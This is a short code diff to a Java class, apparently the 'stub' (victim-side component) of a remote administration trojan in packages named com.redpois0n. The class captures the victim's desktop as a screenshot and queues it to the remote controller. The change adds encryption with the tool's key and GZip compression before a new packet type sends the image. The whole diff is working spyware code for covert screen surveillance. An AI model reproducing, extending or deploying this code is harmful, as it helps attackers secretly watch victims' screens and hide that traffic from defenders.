@@ -8,7 +8,10 @@ import java.awt.Toolkit;
 import java.awt.image.BufferedImage;
 
 import com.redpois0n.Connection;
-import com.redpois0n.packets.outgoing.Header;
+import com.redpois0n.Main;
+import com.redpois0n.common.compress.GZip;
+import com.redpois0n.common.crypto.Crypto;
+import com.redpois0n.stub.packets.outgoing.Packet68QuickDesktop;
 import com.redpois0n.utils.ImageUtils;
 
 public class PacketQUICKDESKTOP extends AbstractIncomingPacket {
@@ -38,14 +41,11 @@ public class PacketQUICKDESKTOP extends AbstractIncomingPacket {
 		BufferedImage resized = new BufferedImage(width, height, BufferedImage.TYPE_INT_RGB);
 		resized.getGraphics().drawImage(image, 0, 0, width, height, null);
 		
-		byte[] buffer = ImageUtils.encodeImage(image, 0.1F);
+		byte[] buffer = GZip.compress(Crypto.encrypt(ImageUtils.encodeImage(image, 0.1F), Main.getKey()));
 		
-		Connection.addToSendQueue(new PacketBuilder(Header.QUICK_DESKTOP));
+		Connection.addToSendQueue(new Packet68QuickDesktop(buffer));		
 		
-		Connection.lock();	
-		Connection.writeInt(buffer.length);
-		Connection.dos.write(buffer);	
-		Connection.lock();
+		System.gc();
 	}
 
 }
